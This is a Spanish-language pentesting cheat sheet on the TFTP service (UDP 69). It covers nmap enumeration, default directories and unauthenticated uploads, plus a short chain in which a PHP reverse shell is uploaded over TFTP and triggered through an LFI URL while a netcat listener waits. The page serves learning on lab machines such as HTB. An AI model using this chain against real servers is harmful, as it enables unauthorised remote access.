---
description: >-
  Es un protocolo simple de transferencia, más básico que FTP y funciona por UDP
  en vez de TCP
---

# 69/UDP TFTP

## Enumeración

No proporciona un listado de directorios por lo que podemos intentar enumerar con nmap:

```
nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP>
```

### Directorios por defecto

```
#Configuración (Puedes ver el directorio de archivos si tienes acceso)
/etc/default/tftpd-hpa

#Directorio de archivos
/var/lib/tftpboot/
```

## Descargar o cargar archivos

Al no requerir autenticación en principio podemos descargar o cargar archivos, dependiendo de otros servicios que pueda tener el servidor esto podría permitirnos establecer una _Reverse Shell_.

```bash
#Instalar
sudo apt install tftp
#Iniciar
tftp <IP>
#Subir archivo
tftp> put archivo
#Salir
tftp> quit
```

### Local File Inclusion/ Directory path traversal

Pongamos que tenemos por ejemplo una vulnerabilidad LFI, podríamos subir una reverse shell y ejecutarla gracias a esta vulnerabilidad.

```
#Subimos una reverse shell
tftp> put reverseshell.php

#Entramos con el navegador (Poniéndonos previamente a la escucha con nc)
http://IP/?file=/var/lib/tftpboot/reverseshell.php
```

### Practicar

* Máquina "[included](../../HTB/htb/included.md#tftp)" de HTB \[Acceso 13/12/2021]

> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
